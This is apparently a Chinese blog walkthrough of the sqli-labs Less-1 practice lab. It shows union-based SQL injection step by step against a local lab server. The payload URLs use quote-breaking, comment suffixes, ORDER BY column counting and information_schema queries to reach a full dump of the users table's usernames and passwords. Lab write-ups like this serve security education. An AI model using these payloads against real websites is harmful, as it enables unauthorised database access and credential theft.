---
title: sql-labs Less-1
date: 2017-9-21
tags: [sqli-labs]
---

#### sql 字符
字符串运算符 ```'or```, 

多行注释 ```/*...*/```,   

加号,连接（在URL中等同于空格） ```+```,

单行注释 ```#```,

或 ```--```

#### 注入
![Alt text](http://image-1252432001.file.myqcloud.com/sqli1.png)

输入id值为```1'```来破坏查询。

```sql
http://localhost/sqli-labs/Less-1/?id=1'
```
得到下列结果

![Alt text](http://image-1252432001.file.myqcloud.com/sqli2.png)

可以猜测后端应该是

```sql
SELECT * from table_name WHERE id='1';
```
or
```sql
SELECT * from table_name WHERE id=('1');
```

or

```sql
SELECT * from table_name WHERE id="1";
```

来猜一下:

```sql
http://localhost/sqli-labs/Less-1/?id=1\
```

利用转义字符来验证猜测

![Alttext](http://image-1252432001.file.myqcloud.com/sqli3.png)

结果中有```''1\'```,那么后端的查询应该是

```sql
SELECT * from table_name WHERE id='1';
```

那么如果输入```1'```完整的查询应该是

```sql
SELECT * from table_name WHERE id='1'';
```

所以这条查询有错误。

那么怎么不让它报错呢？

利用sql字符构建

```sql
http://localhost/sqli-labs/Less-1/?id=1'--+
```

得到下图

![Alttext](http://image-1252432001.file.myqcloud.com/sqli4.png)

其实这里的```--+```相当于注释，加号连接（在URL中等同于空格）```+```，

后端语句为

```sql
SELECT * from table_name WHERE id='1'--+';
```

等效于

```sql
SELECT * from table_name WHERE id='1';
```

所以登录成功。


----------


**现在我们既可以破坏查询，又可以修复它的语法错误了，接下来我们要努力在引号和 --+ 之间添加查询来获取数据库中的信息。**

为了使用```union```**（UNION操作符用于合并两个或多个SELECT语句的结果集。但是有一个前提条件，那就是UNION操作符两边的列数必须相同）**,我需要知道表的列数。

使用```order by```，来获取列数。

构建语句

```sql
http://localhost/sqli-labs/Less-1/?id=1' order by 1 --+
```

显示正确

![Alttext](http://image-1252432001.file.myqcloud.com/sqli5.png)

当构建

```sql
http://localhost/sqli-labs/Less-1/?id=1' order by 4 --+
```

出现了下图

![Alttext](http://image-1252432001.file.myqcloud.com/sqli6.png)

可以猜到这个表有3列，然后就可以使用```union```了。


----------

构建语句

```sql
http://localhost/sqli-labs/Less-1/?id=1' union select 1,2,3 --+
```

![Alttext](http://image-1252432001.file.myqcloud.com/sqli7.png)

显示正常

为了将第二个查询的结果显示出来，需要将第一条查询变成空，可以将```id```的值设为负值或者大于14.

构建语句

```sql
http://localhost/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+
```

![Alttext](http://image-1252432001.file.myqcloud.com/sqli8.png)


图示显示``` name: 2 ```, ``` password: 3 ```，可以构建语句

```sql
http://localhost/sqli-labs/Less-1/?id=-1' union select 1,2,verison（） --+
```

![Alttext](http://image-1252432001.file.myqcloud.com/sqli9.png)

显示版本号。

下面开始爆出数据库名。

构建语句

```sql
http://localhost/sqli-labs/Less-1/?id=-1' union select 1,database(),verison（） --+
```

![Alttext](http://image-1252432001.file.myqcloud.com/sqli10.png)

得到数据库名为```security```.

接下来可以利用 information_schema这个数据库，爆出表名。

构建语句

```sql
http://localhost/sqli-labs/Less-1/?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema = 'security' --+
```

![Alttext](http://image-1252432001.file.myqcloud.com/sqli11.png)

利用```group_concat()``` 来查取所有的表名。

构建语句

```sql
http://localhost/sqli-labs/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = 'security' --+
```

![Alttext](http://image-1252432001.file.myqcloud.com/sqli12.png)

爆出全部表名。

接下来爆出```users```表的列名，也是利用information_schema这个数据库。

构建语句

```sql
http://localhost/sqli-labs/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name = 'users' --+
```

![Alttext](http://image-1252432001.file.myqcloud.com/sqli13.png)

那么可以得到users表中的所以登录名和密码

构建语句

```sql
http://localhost/sqli-labs/Less-1/?id=-1' union select 1,group_concat(username),group_concat(password) from users --+
```

![Alttext](http://image-1252432001.file.myqcloud.com/sqli14.png)

**这么就把库给脱了！**
